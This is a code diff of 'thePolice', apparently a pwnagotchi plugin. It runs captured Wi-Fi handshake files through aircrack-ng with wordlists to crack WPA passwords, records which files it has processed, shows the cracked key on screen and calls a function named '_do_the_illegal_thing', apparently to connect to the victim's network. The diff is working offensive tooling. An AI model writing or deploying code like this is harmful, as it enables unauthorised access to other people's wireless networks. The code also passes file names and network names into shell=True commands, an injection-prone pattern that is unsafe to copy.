@@ -30,55 +30,68 @@ you here by agree to sit quietly in the back of the police car.
 '''
 
 import logging
+import json
 import os
 import subprocess
 import string
 import re
 from collections import namedtuple
+from pwnagotchi.utils import StatusFile
 
+READY = False
 OPTIONS = dict()
+REPORT = StatusFile('/root/.aircracked_pcaps', data_format='json')
 TEXT_TO_SET = ''
 
 PwndNetwork = namedtuple('PwndNetwork', 'ssid bssid password')
 handshake_file_re = re.compile('^(?P<ssid>.+?)_(?P<bssid>[a-f0-9]{12})\.pcap\.cracked$')
+crackable_handshake_re = re.compile('\s+\d+\s+(?P<bssid>([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2})\s+(?P<ssid>.+?)\s+((\([1-9][0-9]* handshake(, with PMKID)?\))|(\(\d+ handshake, with PMKID\)))')
 
 
 def on_loaded():
+    global READY
     logging.info('[thePolice] Quick rides to prison and dictionary check plugin loaded.')
+    READY = True
+
+
+def on_ready(agent):
+    global REPORT
+
+    if not READY:
+        return
+
+    try:
+        config = agent.config()
+        reported = REPORT.data_field_or('reported', default=list())
+        all_pcap_files = [os.path.join(config['bettercap']['handshakes'], filename) for filename in os.listdir(config['bettercap']['handshakes']) if filename.endswith('.pcap')]
+        new_pcap_files = set(all_pcap_files) - set(reported)
+
+        if not new_pcap_files:
+            return
+
+        for pcap_file in new_pcap_files:
+            logging.info('[thePolice] Running uncracked pcap through aircrack: %s'%(pcap_file))
+            try:
+                _do_crack(agent, pcap_file)
+                reported.append(pcap_file)
+                REPORT.update(data={'reported': reported})
+            except:
+                continue
+
+    except Exception as e:
+        logging.error('[thePolice] Encountered exception in on_ready: %s'%(e))
 
 
 def on_handshake(agent, filename, access_point, client_station):
-    config = agent.config()    
-    display = agent._view
-
+    global REPORT 
     try:
-        if config['main']['plugins']['quickdic']['enabled'] == 'true':
-            logging.warning('[thePolice] Plugin quickdic is enabled. Cannot run with quickdic enabled...')
-            return
+        reported = REPORT.data_field_or('reported', default=list())
+        if filename not in reported:
+            _do_crack(agent, filename)
+            reported.append(filename)
+            REPORT.update(data={'reported': reported})
     except Exception as e:
-        logging.warning('[thePolice] Exception while checking for quickdic plugin in config file: %s', e)
-
-    result = subprocess.run(('/usr/bin/aircrack-ng '+ filename +' | grep "1 handshake" | awk \'{print $2}\''),shell=True, stdout=subprocess.PIPE)
-    result = result.stdout.decode('utf-8').translate({ord(c) :None for c in string.whitespace})
-	
-    if not result:
-        logging.info('[thePolice] No handshake')
-        return
-    
-    logging.info('[thePolice] Handshake confirmed')
-    try:        
-        result2 = subprocess.run(('aircrack-ng -w `echo '+OPTIONS['wordlist_folder']+'*.txt | sed \'s/\ /,/g\'` -l '+filename+'.cracked -q -b '+result+' '+filename+' | grep KEY'),shell=True,stdout=subprocess.PIPE)
-        result2 = result2.stdout.decode('utf-8').strip()
-    except Exception as e:
-        logging.error('[thePolice] Exception while running aircrack-ng: %s', e)
-        return
-
-    logging.info('[thePolice] Aircrack output:'+result2)
-    if result2 != 'KEY NOT FOUND':
-        key = re.search('\[(.*)\]', result2)
-        _do_the_illegal_thing(config['main']['bettercap']['handshakes'])
-        set_text('Cracked password: '+str(key.group(1)))
-        display.update(force=True)
+        logging.error('[thePolice] Encountered exception in on_handshake: %s'%(e))
 
 
 def set_text(text):
@@ -92,6 +105,46 @@ def on_ui_update(ui):
         ui.set('face', '(XωX)')
         ui.set('status', TEXT_TO_SET)
         TEXT_TO_SET = ''
+
+
+def _do_crack(agent, filename):
+    config = agent.config()    
+    display = agent._view
+
+    try:
+        if config['main']['plugins']['quickdic']['enabled'] == 'true':
+            logging.warning('[thePolice] Plugin quickdic is enabled. Cannot run with quickdic enabled...')
+            return
+    except Exception as e:
+        logging.warning('[thePolice] Exception while checking for quickdic plugin in config file: %s', e)
+
+    try:
+        aircrack_execution = subprocess.run('/usr/bin/aircrack-ng %s'%(filename), shell=True, stdout=subprocess.PIPE)
+        result = aircrack_execution.stdout.decode('utf-8').strip()
+    except Exception as e:
+        logging.warning('[thePolice] Exception while running initial aircrack-ng check: %s', e)
+        return
+
+    crackable_handshake = crackable_handshake_re.search(result)
+    if not crackable_handshake:
+        #logging.info('[thePolice] No handshakes found. Aircrack-ng output: %s', result)
+        return
+  
+    logging.info('[thePolice] Confirmed handshakes captured for BSSID: %s', crackable_handshake.group('bssid'))
+
+    try:        
+        aircrack_execution_2 = subprocess.run(('aircrack-ng -w `echo '+os.path.join(OPTIONS['wordlist_folder'],'*.txt')+' | sed \'s/\ /,/g\'` -l '+filename+'.cracked -q '+filename+' -b '+crackable_handshake.group('bssid')+' -p 1 | grep KEY'),shell=True,stdout=subprocess.PIPE)
+        crack_result = aircrack_execution_2.stdout.decode('utf-8').strip()
+    except Exception as e:
+        logging.error('[thePolice] Exception while running aircrack-ng for %s: %s'%(crackable_handshake.group('bssid'),e))
+        return
+
+    #logging.info('[thePolice] Aircrack output: '+crack_result)
+    if crack_result != 'KEY NOT FOUND':
+        key = re.search('\[(.*)\]', crack_result)
+        _do_the_illegal_thing(config['bettercap']['handshakes'])
+        set_text('Cracked password: '+str(key.group(1)))
+        display.update(force=True)
 
 
 def _reconfigure_wpa_supplicant():
